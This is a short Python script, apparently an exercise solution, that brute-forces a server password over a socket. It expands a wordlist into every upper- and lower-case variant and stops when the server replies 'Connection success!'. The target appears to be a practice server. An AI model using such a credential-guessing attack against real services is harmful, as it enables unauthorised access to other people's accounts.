import socket
import sys
import itertools


# find all the possible combinations of upper and lower case letters for each password
def passwords(file):
    for i in file:
        for x in map(lambda x: "".join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in i.strip("\n")))):
            yield x


# takes command line argument and retrieves address and port for a server
# then connects to the server
args = sys.argv
hostname = args[1]
port = int(args[2])
address = (hostname, port)
the_socket = socket.socket()
the_socket.connect(address)
response = ""
# uses a dictionary of common passwords that are all numbers or lowercase letters
file = open("passwords.txt", "r")
password = passwords(file)


# sends passwords to the server and checks if the response is correct
while True:
    to_check = next(password)
    the_socket.send(to_check.encode())
    response = the_socket.recv(1024)
    if response.decode("utf-8") == "Connection success!":
        print(to_check)
        file.close()
        the_socket.close()
        break
